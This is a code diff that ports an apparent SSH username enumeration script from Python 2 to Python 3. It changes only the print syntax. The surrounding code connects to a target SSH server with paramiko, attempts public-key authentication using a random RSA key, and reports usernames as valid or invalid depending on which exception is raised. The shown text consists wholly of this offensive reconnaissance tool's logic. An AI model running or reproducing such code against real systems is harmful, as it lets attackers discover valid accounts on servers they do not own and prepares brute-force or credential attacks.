@@ -45,21 +45,20 @@ sock = socket.socket()
 try:
     sock.connect((args.hostname, args.port))
 except socket.error:
-    print '[-] Failed to connect'
+    print('[-] Failed to connect')
     sys.exit(1)
 
 transport = paramiko.transport.Transport(sock)
 try:
     transport.start_client()
 except paramiko.ssh_exception.SSHException:
-    print '[-] Failed to negotiate SSH transport'
+    print('[-] Failed to negotiate SSH transport')
     sys.exit(2)
 
 try:
     transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
 except InvalidUsername:
-    print '[*] Invalid username'
+    print('[*] Invalid username')
     sys.exit(3)
 except paramiko.ssh_exception.AuthenticationException:
-    print '[+] Valid username'
-    
+    print('[+] Valid username')
